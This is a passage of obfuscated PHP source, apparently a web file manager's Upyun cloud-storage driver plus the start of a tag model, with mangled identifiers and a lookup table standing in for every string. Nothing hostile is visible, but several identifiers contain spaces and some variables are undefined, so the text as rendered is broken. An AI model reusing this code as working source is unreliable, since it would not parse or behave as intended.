$this->_init($ÊÂòïıˆ); } public function _init($½Èà¢õå) { $÷»õíë =& $_SERVER[ê‘³Æ±]; foreach ($½Èà¢õå as $‘ÂµÇ×‹ => $éŞ³ÃÙ™) { if (isset($this->{$‘ÂµÇ×‹})) { $this->{$‘ÂµÇ×‹} = $éŞ³ÃÙ™; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($÷»õíë[1440] . LNG($÷»õíë[1371])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($×Óû¯¦·, $¸æèÁ¡â = "\x47\105\x54") { $ùœì¿ˆÏ =& $_SERVER[ê‘³Æ±]; $ø“Ô©Êø = gmdate($ùœì¿ˆÏ[1404]); $Š¿ªâÙ = base64_encode(hash_hmac($ùœì¿ˆÏ[1441], "{$¸æèÁ¡â}\x26{$×Óû¯¦·}\46{$ø“Ô©Êø}", md5("{$this->userpass}"), !0)); $õ½¤§ = array("\101\165\164\x68\157\162\x69\x7a\141\x74\x69\157\x6e\x3a\125\120\131\125\x4e\x20{$this->username}\x3a{$Š¿ªâÙ}", "\x44\x61\164\x65\72{$ø“Ô©Êø}"); return $õ½¤§; } public function ussRequest($ºĞßú¹Ä, $ÆøíÕ°° = "\x47\105\124", $ëµåçÒ… = false, $Ş©¬ğ«í = false, $¹Ùœ‡¢Õ = false) { $§è¼…Í¼ =& $_SERVER[ê‘³Æ±]; $ºĞßú¹Ä = trim($ºĞßú¹Ä, $§è¼…Í¼[8]); $Ô’ô¾“å = "\57{$this->bucket}\57{$ºĞßú¹Ä}"; $»¤¿ßô = $this->ussHeaders($Ô’ô¾“å, $ÆøíÕ°°); if ($Ş©¬ğ«í) { $»¤¿ßô = array_merge($»¤¿ßô, $Ş©¬ğ«í); } $æùñá” = url_request($this->endpoint . $Ô’ô¾“å, $ÆøíÕ°°, $ëµåçÒ…, $»¤¿ßô, $¹Ùœ‡¢Õ); if (!$æùñá”) { return array($§è¼…Í¼[1178] => !1, $§è¼…Í¼[1180] => $§è¼…Í¼[1442]); } if (strtolower($ÆøíÕ°°) == $§è¼…Í¼[191] || in_array($æùñá”[$§è¼…Í¼[1178]], array($§è¼…Í¼[1297], $§è¼…Í¼[1443]))) { $ëµåçÒ… = $æùñá”[$§è¼…Í¼[1444]]; } else { $ëµåçÒ… = json_decode($æùñá”[$§è¼…Í¼[1180]], !0); if (!$ëµåçÒ…) { $ëµåçÒ… = $æùñá”[$§è¼…Í¼[1180]]; } else { if (!$æùñá”[$§è¼…Í¼[736]] && isset($ëµåçÒ…[$§è¼…Í¼[1445]])) { $ëµåçÒ… = $ëµåçÒ…[$§è¼…Í¼[1445]]; } } } return array($§è¼…Í¼[1178] => $æùñá”[$§è¼…Í¼[736]], $§è¼…Í¼[1180] => $ëµåçÒ…); } public function mkfile($üúè„ü, $„òÌÄÖ = '', $¢³¿ÈÅØ = REPEAT_RENAME) { if ($this->setContent($üúè„ü, $„òÌÄÖ)) { return $this->getPathOuter($üúè„ü); } return !1; } public function mkdir($ÍÜùè©‡, $—ŠÒşÛ® = REPEAT_SKIP) { $”èìŞÛô =& $_SERVER[ê‘³Æ±]; $í¨æü« = trim($ÍÜùè©‡, $”èìŞÛô[8]); if ($this->_isFolder($í¨æü«)) { return $this->getPathOuter($í¨æü«); } $í‡Ãƒƒ¢ = array($”èìŞÛô[1446]); $ÀÇ¹ùñ = $this->ussRequest($í¨æü«, $”èìŞÛô[223], !1, $í‡Ãƒƒ¢); return $ÀÇ¹ùñ[$”èìŞÛô[1178]] ? $this->getPathOuter($í¨æü«) : !1; } public function copyFile($£Ìû…, $†üãı™§) { $È¾”¹„ú =& $_SERVER[ê‘³Æ±]; $™è¦Ô·˜ = array($È¾”¹„ú[1447] . "\57{$this->bucket}\x2f{$£Ìû…}", $È¾”¹„ú[1448]); $¢€Û¿á = $this->ussRequest($†üãı™§, $È¾”¹„ú[225], !1, $™è¦Ô·˜); return $¢€Û¿á[$È¾”¹„ú[1178]] ? !0 : $this->getPathOuter($†üãı™§); } public function moveFile($ÁÁˆ³’õ, $ÅÊ©Ñ¨°) { $è©İŞ‡ê =& $_SERVER[ê‘³Æ±]; $Ÿ„˜ø×Ï = array($è©İŞ‡ê[1449] . "\57{$this->bucket}\x2f{$ÁÁˆ³’õ}", $è©İŞ‡ê[1448]); $§´ƒ÷ññ = $this->ussRequest($ÅÊ©Ñ¨°, $è©İŞ‡ê[225], !1, $Ÿ„˜ø×Ï); return $§´ƒ÷ññ[$è©İŞ‡ê[1178]] ? !0 : $this->getPathOuter($ÅÊ©Ñ¨°); } public function delFile($Ø‰½äÀç) { $Ã²Ëßôò =& $_SERVER[ê‘³Æ±]; $†ã×ÃŞÙ = $this->ussRequest($Ø‰½äÀç, $Ã²Ëßôò[1450]); return $†ã×ÃŞÙ[$Ã²Ëßôò[1178]] ? !0 : !1; } public function delFolder($äƒò˜÷¦) { $ÇèÃ¢´ =& $_SERVER[ê‘³Æ±]; if (!$this->exist($äƒò˜÷¦)) { return !0; } $this->listItemCache = !1; $Î©÷×‹Ü = $Ó¸€”­À = array(); $this->fileList($äƒò˜÷¦, $Î©÷×‹Ü, $Ó¸€”­À, !0); $this->listItemCache = !0; foreach ($Ó¸€”­À as $ÆÆÂÈ‚É) { $¨‰êÜ«Ì = $this->ussRequest($ÆÆÂÈ‚É[$ÇèÃ¢´[32]], $ÇèÃ¢´[1450]); if (!$¨‰êÜ«Ì[$ÇèÃ¢´[1178]]) { return !1; } } foreach ($Î©÷×‹Ü as $ôŞÁ«Š„) { $¨‰êÜ«Ì = $this->ussRequest($ôŞÁ«Š„, $ÇèÃ¢´[1450]); if (!$¨‰êÜ«Ì[$ÇèÃ¢´[1178]]) { return !1; } } $¨‰êÜ«Ì = $this->ussRequest($äƒò˜÷¦, $ÇèÃ¢´[1450]); return $¨‰êÜ«Ì[$ÇèÃ¢´[1178]]; } public function rename($¾·¹­Øø, $ÁéóË¿ã) { if ($this->isFile($¾·¹­Øø)) { $ÁéóË¿ã = get_path_father($¾·¹­Øø) . $ÁéóË¿ã; return $this->moveFile($¾·¹­Øø, $ÁéóË¿ã); } return $this->renameObject($¾·¹­Øø, $ÁéóË¿ã); } public function fileInfo($ûåÅ¤şå, $´£ÒŒ³ï = false, $´²¨¼© = array()) { $É°¹¨åŸ =& $_SERVER[ê‘³Æ±]; $ôÔşàÛ = array($É°¹¨åŸ[32] => $this->pathThis($ûåÅ¤şå), $É°¹¨åŸ[78] => $this->getPathOuter($É°¹¨åŸ[8] . $ûåÅ¤şå), $É°¹¨åŸ[33] => $É°¹¨åŸ[194], $É°¹¨åŸ[80] => isset($´²¨¼©[$É°¹¨åŸ[80]]) ? $´²¨¼©[$É°¹¨åŸ[80]] : 0, $É°¹¨åŸ[169] => $this->ext($ûåÅ¤şå)); if ($´£ÒŒ³ï) { return $ôÔşàÛ; } $ôÔşàÛ[$É°¹¨åŸ[195]] = $ôÔşàÛ[$É°¹¨åŸ[86]] = 0; $ôÔşàÛ[$É°¹¨åŸ[196]] = $ôÔşàÛ[$É°¹¨åŸ[197]] = !0; if (empty($´²¨¼©)) { $´²¨¼© = $this->objectMeta($ûåÅ¤şå); if (!$´²¨¼©) { return $ôÔşàÛ; } } $ôÔşàÛ[$É°¹¨åŸ[195]] = intval($´²¨¼©[$É°¹¨åŸ[1451]]); $ôÔşàÛ[$É°¹¨åŸ[86]] = intval($´²¨¼©[$É°¹¨åŸ[1452]]); $ôÔşàÛ[$É°¹¨åŸ[80]] = $´²¨¼©[$É°¹¨åŸ[80]]; return $ôÔşàÛ; } public function folderInfo($‹‘¿õÜ, $é‰«€“¡ = false) { $˜š©Õòô =& $_SERVER[ê‘³Æ±]; $½ÊŒšÇ‘ = array($˜š©Õòô[32] => $this->pathThis($‹‘¿õÜ), $˜š©Õòô[78] => $this->getPathOuter($˜š©Õòô[8] . $‹‘¿õÜ), $˜š©Õòô[33] => $˜š©Õòô[79]); if ($é‰«€“¡) { return $½ÊŒšÇ‘; } $½ÊŒšÇ‘[$˜š©Õòô[195]] = $½ÊŒšÇ‘[$˜š©Õòô[86]] = 0; $½ÊŒšÇ‘[$˜š©Õòô[196]] = $½ÊŒšÇ‘[$˜š©Õòô[197]] = !0; if (empty($™¾Ø¾…Ú)) { $™¾Ø¾…Ú = $this->objectMeta($‹‘¿õÜ); if (!$™¾Ø¾…Ú) { return $½ÊŒšÇ‘; } } $½ÊŒšÇ‘[$˜š©Õòô[195]] = intval($™¾Ø¾…Ú[$˜š©Õòô[1451]]); $½ÊŒšÇ‘[$˜š©Õòô[86]] = intval($™¾Ø¾…Ú[$˜š©Õòô[1452]]); return $½ÊŒšÇ‘; } private function listObjs($…¹ìëä¶, $ÏˆšÇÂ‡ = 0, $Ò…ãû¤¼ = 1000) { $Áé ×Ç‚ =& $_SERVER[ê‘³Æ±]; $Š¡ÑŸÄ† = array($Áé ×Ç‚[1453], $Áé ×Ç‚[1454] . $Ò…ãû¤¼); if ($ÏˆšÇÂ‡) { $Š¡ÑŸÄ†[] = $Áé ×Ç‚[1455] . $ÏˆšÇÂ‡; } $°Ù´§ß = $this->ussRequest($…¹ìëä¶, $Áé ×Ç‚[227], !1, $Š¡ÑŸÄ†); return !$°Ù´§ß[$Áé ×Ç‚[1178]] ? !1 : $°Ù´§ß[$Áé ×Ç‚[1180]]; } private function fileList($Ê·¿¼ˆœ, &$»Õ¸ÔÅŸ, &$Ëº ßâ€, $ùÊõ«¯Ì = false) { $‰ÓÏ­©‡ =& $_SERVER[ê‘³Æ±]; $êÎ»–“” = $‰ÓÏ­©‡[12]; $•«²öÙ = 1000; $ÒåË›¨æ = rtrim($Ê·¿¼ˆœ, $‰ÓÏ­©‡[8]) . $‰ÓÏ­©‡[8]; $« éşßû = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $èÉ÷˜Îğ = $this->listObjs($Ê·¿¼ˆœ, $êÎ»–“”, $•«²öÙ); if (!$èÉ÷˜Îğ) { return !1; } $êÎ»–“” = isset($èÉ÷˜Îğ[$‰ÓÏ­©‡[1456]]) ? $èÉ÷˜Îğ[$‰ÓÏ­©‡[1456]] : $‰ÓÏ­©‡[12]; $øÙ±óÌ = isset($èÉ÷˜Îğ[$‰ÓÏ­©‡[1457]]) ? $èÉ÷˜Îğ[$‰ÓÏ­©‡[1457]] : array(); foreach ($øÙ±óÌ as $€÷ÃÔêİ) { $§ñôĞè = $€÷ÃÔêİ[$‰ÓÏ­©‡[33]] == $‰ÓÏ­©‡[79] ? !0 : !1; $èç£±óÖ = ltrim($ÒåË›¨æ . $€÷ÃÔêİ[$‰ÓÏ­©‡[32]], $‰ÓÏ­©‡[8]) . ($§ñôĞè ? $‰ÓÏ­©‡[8] : $‰ÓÏ­©‡[12]); $ìŸÖ÷öµ = array($‰ÓÏ­©‡[32] => $èç£±óÖ, $‰ÓÏ­©‡[33] => $§ñôĞè ? $‰ÓÏ­©‡[79] : $‰ÓÏ­©‡[194], $‰ÓÏ­©‡[80] => $€÷ÃÔêİ[$‰ÓÏ­©‡[334]], $‰ÓÏ­©‡[1452] => $€÷ÃÔêİ[$‰ÓÏ­©‡[1458]]); if ($« éşßû) { $this->cacheMethod($‰ÓÏ­©‡[200], $èç£±óÖ, $§ñôĞè); $this->cacheMethod($‰ÓÏ­©‡[201], $èç£±óÖ, $ìŸÖ÷öµ); } if ($§ñôĞè) { $»Õ¸ÔÅŸ[] = $èç£±óÖ; if ($ùÊõ«¯Ì) { $this->fileList($èç£±óÖ, $»Õ¸ÔÅŸ, $Ëº ßâ€, $ùÊõ«¯Ì); } continue; } $Ëº ßâ€[] = $ìŸÖ÷öµ; } if (count($øÙ±óÌ) < $•«²öÙ) { break; } } if ($« éşßû) { $this->cacheMethod($‰ÓÏ­©‡[200], $Ê·¿¼ˆœ, !0); } } public function listPath($Á£èØßè, $ç½ôÕÕØ = false) { $®Å—ª® =& $_SERVER[ê‘³Æ±]; $°¹Ÿ’¤¿ = $º”ãê‡ = array(); $this->fileList($Á£èØßè, $°¹Ÿ’¤¿, $º”ãê‡); foreach ($°¹Ÿ’¤¿ as $ŞÀ²£ÇÓ => $ÈàÔèõ) { $°¹Ÿ’¤¿[$ŞÀ²£ÇÓ] = $this->folderInfo($ÈàÔèõ, $ç½ôÕÕØ); } foreach ($º”ãê‡ as $ŞÀ²£ÇÓ => $ÈàÔèõ) { $º”ãê‡[$ŞÀ²£ÇÓ] = $this->fileInfo($ÈàÔèõ[$®Å—ª®[32]], $ç½ôÕÕØ, $ÈàÔèõ); } return array($®Å—ª®[77] => $°¹Ÿ’¤¿, $®Å—ª®[76] => $º”ãê‡); } public function has($ŞÓÖªçÄ, $Ó¿±òÛ– = false, $æ÷û™™ = true) { $ÜÆÓÏÇº =& $_SERVER[ê‘³Æ±]; $èÎÜÙ ¿ = $ÜÆÓÏÇº[12]; $ºô‚¿×¤ = 500; $·œùÜË© = 0; $Ûâî¤Ø‰ = 0; $‹¸¸‚ş = rtrim($ŞÓÖªçÄ, $ÜÆÓÏÇº[8]) . $ÜÆÓÏÇº[8]; while (!0) { check_abort(); $ÇîÏŸ¶– = $this->listObjs($ŞÓÖªçÄ, $èÎÜÙ ¿, $ºô‚¿×¤); if (!$ÇîÏŸ¶–) { return !1; } $èÎÜÙ ¿ = isset($ÇîÏŸ¶–[$ÜÆÓÏÇº[1456]]) ? $ÇîÏŸ¶–[$ÜÆÓÏÇº[1456]] : $ÜÆÓÏÇº[12]; $œ¸”Şü = isset($ÇîÏŸ¶–[$ÜÆÓÏÇº[1457]]) ? $ÇîÏŸ¶–[$ÜÆÓÏÇº[1457]] : array(); if (empty($œ¸”Şü)) { break; } $Û‰Ö„Š = array_filter($œ¸”Şü, function ($¦šèà) { $ñ«Î¾“† =& $_SERVER[ê‘³Æ±]; return $¦šèà[$ñ«Î¾“†[33]] == $ñ«Î¾“†[79]; }); $‘³Ç›áŠ = count($œ¸”Şü); $Û‰Ö„Š = count($Û‰Ö„Š); $’«µºƒü = $‘³Ç›áŠ - $Û‰Ö„Š; if ($Ó¿±òÛ–) { $Ûâî¤Ø‰ += $Û‰Ö„Š; $·œùÜË© += $’«µºƒü; if ($‘³Ç›áŠ < $ºô‚¿×¤) { break; } continue; } if ($æ÷û™™) { if ($’«µºƒü) { return !0; } } else { if ($Û‰Ö„Š) { return !0; } } if ($‘³Ç›áŠ < $ºô‚¿×¤) { break; } } if ($Ó¿±òÛ–) { return array($ÜÆÓÏÇº[204] => $·œùÜË©, $ÜÆÓÏÇº[205] => $Ûâî¤Ø‰); } return !1; } public function listAll($¹¼“ö¦) { $÷Õµøñ =& $_SERVER[ê‘³Æ±]; $¥ò õ¥³ = $©ô¾ë× = array(); $this->fileList($¹¼“ö¦, $¥ò õ¥³, $©ô¾ë×, !0); $ÙíÆØ×· = array(); foreach ($©ô¾ë× as $Üñø£Ø®) { $ÙíÆØ×·[$Üñø£Ø®[$÷Õµøñ[32]]] = $Üñø£Ø®[$÷Õµøñ[80]]; } foreach ($¥ò õ¥³ as $Üñø£Ø®) { if (is_string($Üñø£Ø®)) { $ÙíÆØ×·[$Üñø£Ø®] = 0; } } return $this->listAllFiles($¹¼“ö¦, array_keys($ÙíÆØ×·), $ÙíÆØ×·); } public function canRead($ªÏúàù) { return $this->exist($ªÏúàù) ? !0 : !1; } public function canWrite($æÍ·ï»Â) { return $this->exist($æÍ·ï»Â) ? !0 : !1; } public function getContent($¾º¸†îö) { return $this->fileSubstr($¾º¸†îö, 0, -1); } public function setContent($ºÑà·ı¼, $±‹¼Å¾ = '') { $à¾ë¸è =& $_SERVER[ê‘³Æ±]; if (!$±‹¼Å¾) { $ĞÇ»†Ê§ = $this->ussRequest($ºÑà·ı¼, $à¾ë¸è[223]); return $ĞÇ»†Ê§[$à¾ë¸è[1178]]; } $ŸªºŸªî = $this->tempFile($this->pathThis($ºÑà·ı¼)); file_put_contents($ŸªºŸªî, $±‹¼Å¾); if ($this->upload($ºÑà·ı¼, $ŸªºŸªî)) { $this->tempFileRemve($ŸªºŸªî); return !0; } return !1; } public function fileSubstr($é©ö© , $­–ï®Ÿç, $ÂÓÏü©Ä) { $¯éìÆû =& $_SERVER[ê‘³Æ±]; if (!($ô½ÔÙ¯ = $this->link($é©ö© ))) { return !1; } $÷‘é½“ƒ = !1; if ($ÂÓÏü©Ä > 0) { $â¢êƒĞÂ = $­–ï®Ÿç + $ÂÓÏü©Ä - 1; $÷‘é½“ƒ = array($¯éìÆû[1419] . $­–ï®Ÿç . $¯éìÆû[453] . $â¢êƒĞÂ); } $×Ÿ×”£ã = url_request($ô½ÔÙ¯, $¯éìÆû[227], !1, $÷‘é½“ƒ); return $×Ÿ×”£ã[$¯éìÆû[736]] ? $×Ÿ×”£ã[$¯éìÆû[1180]] : !1; } public function upload($ÆÅÕœÉö, $„õ¯¶”, $êş¯¥Öî = false, $˜û»ª´ = REPEAT_REPLACE) { $äÈÃ¶š‡ =& $_SERVER[ê‘³Æ±]; $Ú³›¶–¸ = IO::size($„õ¯¶”); if ($Ú³›¶–¸ <= 1024 * 1024 * 200) { $À›ê—‹ = array($äÈÃ¶š‡[1459] . $„õ¯¶”); $ˆÒ™ÍöÓ = $this->ussRequest($ÆÅÕœÉö, $äÈÃ¶š‡[225], $À›ê—‹); return $ˆÒ™ÍöÓ[$äÈÃ¶š‡[1178]] ? $this->getPathOuter($ÆÅÕœÉö) : !1; } $¼°Ì–Î‚ = 1024 * 1024 * 10; $¶ß’Å = array($äÈÃ¶š‡[1460], $äÈÃ¶š‡[1461] . $Ú³›¶–¸, $äÈÃ¶š‡[1462], $äÈÃ¶š‡[1463] . $¼°Ì–Î‚); $ˆÒ™ÍöÓ = $this->ussRequest($ÆÅÕœÉö, $äÈÃ¶š‡[225], !1, $¶ß’Å); if (!$ˆÒ™ÍöÓ[$äÈÃ¶š‡[1178]]) { return !1; } $ĞÏğÁš = $ˆÒ™ÍöÓ[$äÈÃ¶š‡[1180]]; $øÛ– Ş = 0; $¹ÖÂÆ—¶ = $ĞÏğÁš[$äÈÃ¶š‡[1464]]; $ó¹¬‡â = fopen($„õ¯¶”, $äÈÃ¶š‡[1368]); if (!$ó¹¬‡â) { return !1; } do { $Ï…÷ˆ¾€ = $ĞÏğÁš[$äÈÃ¶š‡[1465]]; fseek_64($ó¹¬‡â, $øÛ– Ş); $İš„Üé“ = fread($ó¹¬‡â, $Ï…÷ˆ¾€); $†Ë¢Úß£ = 0; do { $†Ë¢Úß£++; $ĞÏğÁš = $this->uploadPart($ÆÅÕœÉö, $ĞÏğÁš, $İš„Üé“); } while (!$ĞÏğÁš && $†Ë¢Úß£ < 3); if (!$ĞÏğÁš) { return !1; } $¹ÖÂÆ—¶ = $ĞÏğÁš[$äÈÃ¶š‡[1464]]; $øÛ– Ş += $Ï…÷ˆ¾€; } while ($¹ÖÂÆ—¶ != -1); fclose($ó¹¬‡â); $¶ß’Å = array($äÈÃ¶š‡[1466], $äÈÃ¶š‡[1467] . $ĞÏğÁš[$äÈÃ¶š‡[1468]], $äÈÃ¶š‡[1462]); $ˆÒ™ÍöÓ = $this->ussRequest($ÆÅÕœÉö, $äÈÃ¶š‡[225], !1, $¶ß’Å); return $ˆÒ™ÍöÓ[$äÈÃ¶š‡[1178]] ? $this->getPathOuter($­¯ò©ëà) : !1; } private function uploadPart($‘¡¦Ğ, $õÈÇäÔ€, &$Ÿµ›·ïé) { $—©­ø¯” =& $_SERVER[ê‘³Æ±]; $€´Î³ß÷ = array($—©­ø¯”[1469], $—©­ø¯”[1467] . $õÈÇäÔ€[$—©­ø¯”[1468]], $—©­ø¯”[1470] . $õÈÇäÔ€[$—©­ø¯”[1464]], $—©­ø¯”[141] . $õÈÇäÔ€[$—©­ø¯”[1465]]); $ŸÏãÔ¡ = $this->ussRequest($‘¡¦Ğ, $—©­ø¯”[225], $Ÿµ›·ïé, $€´Î³ß÷); return !$ŸÏãÔ¡[$—©­ø¯”[1178]] ? $ŸÏãÔ¡[$—©­ø¯”[1178]] : $ŸÏãÔ¡[$—©­ø¯”[1180]]; } public function uploadFormData($Åîò «Ğ, $‰Å¼öÖí = 3600) { return $this->uploadPolicy($Åîò «Ğ, $‰Å¼öÖí); } public function multiUploadFormData($‹¥ƒœÉ“, $ş¼úòæï = 3600) { $ĞŠëñÓ =& $_SERVER[ê‘³Æ±]; $¨õö›Æ´ = (int) $GLOBALS[$ĞŠëñÓ[7]][$ĞŠëñÓ[80]]; return $this->uploadPolicy($‹¥ƒœÉ“, $ş¼úòæï, $¨õö›Æ´); } private function uploadPolicy($ƒŒËåƒ¾, $²”õŞ†ù = 3600, $û†İÍ·Õ = 0) { $¡¥¨èí€ =& $_SERVER[ê‘³Æ±]; $íÇ¥è´Â = $¡¥¨èí€[8] . $this->bucket; $ïÇîşƒŸ = gmdate($¡¥¨èí€[1404]); $é³û³ş¸ = array($¡¥¨èí€[1471] => $this->bucket, $¡¥¨èí€[1472] => $ƒŒËåƒ¾, $¡¥¨èí€[1473] => time() + $²”õŞ†ù, $¡¥¨èí€[1474] => $ïÇîşƒŸ); if ($û†İÍ·Õ) { $é³û³ş¸[$¡¥¨èí€[1384]] = $û†İÍ·Õ; } $š¦ªĞ„Ó = base64_encode(json_encode($é³û³ş¸)); $äÆäÛì = base64_encode(hash_hmac($¡¥¨èí€[1441], "\120\117\x53\x54\x26{$íÇ¥è´Â}\46{$ïÇîşƒŸ}\46{$š¦ªĞ„Ó}", md5("{$this->userpass}"), !0)); $ÛÀæ¥á = array($¡¥¨èí€[1309] => $š¦ªĞ„Ó, $¡¥¨èí€[1475] => "\x55\x50\131\125\x4e\40{$this->username}\72{$äÆäÛì}", $¡¥¨èí€[176] => $this->endpoint . $íÇ¥è´Â); return $ÛÀæ¥á; } public function download($ïÁÇıš, $˜­©…ç) { $Â¢¨‚ˆé = IO::getPathInner(IO::mkfile($˜­©…ç)); if (!($èİÑó¿† = $this->link($ïÁÇıš))) { return !1; } $ŞıÌé‚ï = 0; $ªÒ€Øúõ = 1024 * 200; $‚œç‚Ï” = fopen($Â¢¨‚ˆé, $_SERVER[ê‘³Æ±][1425]); while (!0) { $‰ŒõÖ = $this->fileSubstr($ïÁÇıš, $ŞıÌé‚ï, $ªÒ€Øúõ); if ($‰ŒõÖ === !1) { return !1; } fwrite($‚œç‚Ï”, $‰ŒõÖ); $ŞıÌé‚ï += $ªÒ€Øúõ; if (strlen($‰ŒõÖ) < $ªÒ€Øúõ) { break; } } fclose($‚œç‚Ï”); return $˜­©…ç; } public function link($’Ûğ‰šÖ, $şİ¸Ù°Ñ = array()) { $äñ¨Ôæ =& $_SERVER[ê‘³Æ±]; $’Ûğ‰šÖ = trim($’Ûğ‰šÖ, $äñ¨Ôæ[8]); if (!empty($this->token)) { $©ç™èş„ = strtotime(date($äñ¨Ôæ[1476])); $¶½é£­Ç = substr(md5($this->token . $äñ¨Ôæ[281] . $©ç™èş„ . $äñ¨Ôæ[1477] . $’Ûğ‰šÖ), 12, 8) . $©ç™èş„; $şİ¸Ù°Ñ[] = $äñ¨Ôæ[1478] . $¶½é£­Ç; } $×ñáÅ«ò = !empty($şİ¸Ù°Ñ) ? $äñ¨Ôæ[73] . implode($äñ¨Ôæ[281], $şİ¸Ù°Ñ) : $äñ¨Ôæ[12]; return $this->getHost() . $äñ¨Ôæ[8] . $’Ûğ‰šÖ . $×ñáÅ«ò; } public function fileOut($ÁÚ¥ç¨ò, $— ššÎ = false, $Â¹Ñ†ó¡ = false, $ÚùÛ°–É = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ÁÚ¥ç¨ò, $— ššÎ, $Â¹Ñ†ó¡, $ÚùÛ°–É); } if (!$Â¹Ñ†ó¡) { $Â¹Ñ†ó¡ = $this->pathThis($ÁÚ¥ç¨ò); } $¬¹¸×ëã = $— ššÎ ? array($_SERVER[ê‘³Æ±][1479] . rawurlencode($Â¹Ñ†ó¡)) : array(); $±®Ÿª­ı = $this->link($ÁÚ¥ç¨ò, $¬¹¸×ëã); $this->fileOutLink($±®Ÿª­ı); } public function fileOutServer($Ğ±¹Œ¿Ú, $»¡í­¾ = false, $Ë—ÍíÙÚ = false, $Éò¥¡á© = '') { parent::fileOut($Ğ±¹Œ¿Ú, $»¡í­¾, $Ë—ÍíÙÚ, $Éò¥¡á©); } public function fileOutImage($´“®˜ğ³, $øÆ¨£à• = 250) { $úÂÏÁ—¿ = $this->link($´“®˜ğ³ . $_SERVER[ê‘³Æ±][1480] . $øÆ¨£à•); $this->fileOutLink($úÂÏÁ—¿); } public function fileOutImageServer($¹Íéó×‰, $Ë¼ÙûÔµ = 250) { parent::fileOutImage($¹Íéó×‰, $Ë¼ÙûÔµ); } public function hashMd5($Ù“Ãì´) { $Ş¬²§à’ =& $_SERVER[ê‘³Æ±]; $Ïä‘ŠùÔ = $this->_objectMeta($Ù“Ãì´); return isset($Ïä‘ŠùÔ[$Ş¬²§à’[209]]) ? $Ïä‘ŠùÔ[$Ş¬²§à’[209]] : !1; } public function size($öóï‰è¬) { $²¤¼åô‹ = $this->objectMeta($öóï‰è¬); return $²¤¼åô‹ ? $²¤¼åô‹[$_SERVER[ê‘³Æ±][80]] : 0; } public function info($ŞĞÇìè’) { if ($this->isFolder($ŞĞÇìè’)) { return $this->folderInfo($ŞĞÇìè’); } else { if ($this->isFile($ŞĞÇìè’)) { return $this->fileInfo($ŞĞÇìè’); } } return !1; } public function exist($¼ÅÏ„â») { return $this->isFile($¼ÅÏ„â») || $this->isFolder($¼ÅÏ„â»); } public function isFile($„ÈÅô–ö) { return !$this->isFolder($„ÈÅô–ö) && $this->objectMeta($„ÈÅô–ö); } public function isFolder($È©ı³Õ) { return $this->cacheMethod($_SERVER[ê‘³Æ±][200], $È©ı³Õ); } protected function objectMeta($åúÑèÀ) { return $this->cacheMethod($_SERVER[ê‘³Æ±][201], $åúÑèÀ); } protected function _objectMeta($õòöÒ°) { $ÄÉ… ù =& $_SERVER[ê‘³Æ±]; if ($õòöÒ° == $ÄÉ… ù[12] || $õòöÒ° == $ÄÉ… ù[8]) { return array(); } $æÎÄ½ºì = $this->ussRequest($õòöÒ°, $ÄÉ… ù[1481]); if (!$æÎÄ½ºì[$ÄÉ… ù[1178]]) { return null; } $ÏÁÂ¯ßÅ = isset($æÎÄ½ºì[$ÄÉ… ù[1180]]) ? $æÎÄ½ºì[$ÄÉ… ù[1180]] : array(); if (!isset($ÏÁÂ¯ßÅ[$ÄÉ… ù[1482]])) { return null; } $ãªÆş½­ = array($ÄÉ… ù[33] => isset($ÏÁÂ¯ßÅ[$ÄÉ… ù[1482]]) ? $ÏÁÂ¯ßÅ[$ÄÉ… ù[1482]] : null, $ÄÉ… ù[80] => isset($ÏÁÂ¯ßÅ[$ÄÉ… ù[1483]]) ? $ÏÁÂ¯ßÅ[$ÄÉ… ù[1483]] : null, $ÄÉ… ù[209] => isset($ÏÁÂ¯ßÅ[$ÄÉ… ù[1484]]) ? $ÏÁÂ¯ßÅ[$ÄÉ… ù[1484]] : null, $ÄÉ… ù[1451] => isset($ÏÁÂ¯ßÅ[$ÄÉ… ù[1485]]) ? $ÏÁÂ¯ßÅ[$ÄÉ… ù[1485]] : null); $ãªÆş½­[$ÄÉ… ù[1452]] = isset($ÏÁÂ¯ßÅ[$ÄÉ… ù[1486]]) ? strtotime($ÏÁÂ¯ßÅ[$ÄÉ… ù[1486]]) : $ãªÆş½­[$ÄÉ… ù[1451]]; return $ãªÆş½­; } protected function _isFolder($†Õ½¸Üà) { $ŞŠ®ïÓ¥ =& $_SERVER[ê‘³Æ±]; if ($†Õ½¸Üà == $ŞŠ®ïÓ¥[12] || $†Õ½¸Üà == $ŞŠ®ïÓ¥[8]) { return !0; } $’¯ë¬ë× = $this->_objectMeta($†Õ½¸Üà); return isset($’¯ë¬ë×[$ŞŠ®ïÓ¥[33]]) && $’¯ë¬ë×[$ŞŠ®ïÓ¥[33]] == $ŞŠ®ïÓ¥[79] ? !0 : !1; } } goto BÓÌÄêì×Ğ; d÷å‘ËæØÊ: class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\162\137\146\141\x76"; protected function cacheFunctionAlias($Ë‡Ü‘®) { $Öİå´Üş =& $_SERVER[ê‘³Æ±]; return array($Öİå´Üş[1915] => array($Ë‡Ü‘®[0], $Öİå´Üş[1916]), $Öİå´Üş[1917] => array($Ë‡Ü‘®[0], $Öİå´Üş[1918])); } protected function get($şÍÉà×œ) { $øëÑĞÑ =& $_SERVER[ê‘³Æ±]; $ğÔ†šœÑ = Model($øëÑĞÑ[515])->metaGet($şÍÉà×œ, $øëÑĞÑ[1919]); $ƒ½»½ÔÖ = json_decode($ğÔ†šœÑ, !0); return $ƒ½»½ÔÖ ? $ƒ½»½ÔÖ : array($øëÑĞÑ[1920] => $øëÑĞÑ[89], $øëÑĞÑ[366] => array()); } protected function set($Ú’·ëñì, $çç¥Àé…) { $ƒ‚è€Åé =& $_SERVER[ê‘³Æ±]; $çç¥Àé… = $çç¥Àé… ? $çç¥Àé… : array($ƒ‚è€Åé[1920] => $ƒ‚è€Åé[89], $ƒ‚è€Åé[366] => array()); Model($ƒ‚è€Åé[515])->metaSet($Ú’·ëñì, $ƒ‚è€Åé[1919], json_encode($çç¥Àé…)); return Model($ƒ‚è€Åé[515])->metaSet($Ú’·ëñì, $ƒ‚è€Åé[1919], json_encode($çç¥Àé…)); } protected function getByTagID($öè¤•›, $ÂÃ¢«›) { $¬Şüö¿Ó =& $_SERVER[ê‘³Æ±]; if (!$öè¤•› || !$ÂÃ¢«›) { return !1; } if (!Model($¬Şüö¿Ó[515])->getInfoSimple($öè¤•›)) { return !1; } $¹ÍôÚÄ 